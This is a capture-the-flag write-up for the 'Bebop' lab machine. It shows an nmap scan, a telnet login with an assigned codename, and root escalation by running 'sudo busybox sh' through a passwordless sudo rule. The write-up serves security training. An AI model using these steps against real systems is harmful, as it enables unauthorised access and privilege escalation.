# Bebop writeup

## Description

*Who thought making a flying shell was a good idea?*

## Challenges

### Takeoff

For this mission, you have been assigned the codename "pilot".

Press the Start Machine button to make the drone takeoff!

### Manoeuvre

Capture time! Hack the deployed ordinance, retrieve that flags, and submit it below! Make sure to utilise your codename!

Check open ports

`nmap -A -vv -T4 10.10.36.154`

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.5 (FreeBSD 20170903; protocol 2.0)
| ssh-hostkey: 
|   2048 5b:e6:85:66:d8:dd:04:f0:71:7a:81:3c:58:ad:0b:b9 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHwR9KKb3OSPvSUHz9yw6aPdhsdjjZx9CvUN60u5d/OQCXcYo+4HVppBUIv31LQyJjkx2xexQTA/hZtsxDFDm+hmkh1MF7lhnsKLhfPHt/7fcUzvkMuqBAAnuaQuBtl6Uamqi+1KW018dwf0tGh7PoKgTsx0gC+Bic+yY/I2fxvqkGTOlGZEiCEXEbe/eTGdruo0w2vVH1e4VoxAoL2wPBSchR8R53j6sbED8+QbahdhsdEGBGrQ481disFjBMLy+DbNYMviqIvMcRKv11fut843iuJssl0P4/h0ewOgDBGS3bcnatPr7o8YNjf05rHJ0lcuhCZBbuzzvzF+26EMef
|   256 d5:4e:18:45:ba:d4:75:2d:55:2f:fe:c9:1c:db:ce:cb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPlqfDN7Lwi9D/1vME40xU+tiXw3ubwrqePXtNytyFeJAb4CA2qW+cuPq67LcRT7haCOoX+rDENgL+sFi3eg1Lw=
|   256 96:fc:cc:3e:69:00:79:85:14:2a:e4:5f:0d:35:08:d4 (EdDSA)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ6YQS6APysyb8rYAxb4jbQdlorQdNW/urVO4RPXQoPe
23/tcp open  telnet  syn-ack ttl 64 BSD-derived telnetd
MAC Address: 02:5B:6B:A8:AD:BB (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.60%E=4%D=5/7%OT=22%CT=1%CU=41967%PV=Y%DS=1%DC=D%G=Y%M=025B6B%TM
OS:=6639A4A2%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=109%TI=Z%CI=Z%TS=22
OS:)SEQ(SP=101%GCD=1%ISR=10B%TI=Z%CI=Z%II=RI%TS=22)OPS(O1=M2301NW6ST11%O2=M
OS:2301NW6ST11%O3=M2301NW6NNT11%O4=M2301NW6ST11%O5=M2301NW6ST11%O6=M2301ST1
OS:1)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFFF)ECN(R=Y%DF=Y%T=40%
OS:W=FFFF%O=M2301NW6SLL%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R
OS:=N)T3(R=Y%DF=Y%T=40%W=FFFF%S=O%A=S+%F=AS%O=M2301NW6ST11%RD=0%Q=)T4(R=Y%D
OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W
OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=38%UN=0%RIPL=G%RID=G%RI
OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=S%T=40%CD=S)
```

Gain initial access

`telnet 10.10.36.154`

```
Trying 10.10.36.154...
Connected to 10.10.36.154.
Escape character is '^]'.
login: pilot
Last login: Sat Oct  5 23:48:53 from cpc147224-roth10-2-0-cust456.17-1.cable.virginm.net
FreeBSD 11.2-STABLE (GENERIC) #0 r345837: Thu Apr  4 02:07:22 UTC 2019

Welcome to FreeBSD!

Release Notes, Errata: https://www.FreeBSD.org/releases/
Security Advisories:   https://www.FreeBSD.org/security/
FreeBSD Handbook:      https://www.FreeBSD.org/handbook/
FreeBSD FAQ:           https://www.FreeBSD.org/faq/
Questions List: https://lists.FreeBSD.org/mailman/listinfo/freebsd-questions/
FreeBSD Forums:        https://forums.FreeBSD.org/

Documents installed with the system are in the /usr/local/share/doc/freebsd/
directory, or can be installed later with:  pkg install en-freebsd-doc
For other languages, replace "en" with a language code like de or fr.

Show the version of FreeBSD installed:  freebsd-version ; uname -a
Please include that output and any error messages when posting questions.
Introduction to manual pages:  man man
FreeBSD directory layout:      man hier

Edit /etc/motd to change this login announcement.
Want to see how much virtual memory you're using? Just type "swapinfo" to
be shown information about the usage of your swap partitions.
[pilot@freebsd ~]$ ls
user.txt
[pilot@freebsd ~]$ cat user.txt
```

Escalate privileges

```
[pilot@freebsd /home]$ sudo -l
User pilot may run the following commands on freebsd:
    (root) NOPASSWD: /usr/local/bin/busybox
[pilot@freebsd /home]$ sudo busybox sh
# ls
dan		ec2-user	pilot
# cat /root/root.txt
```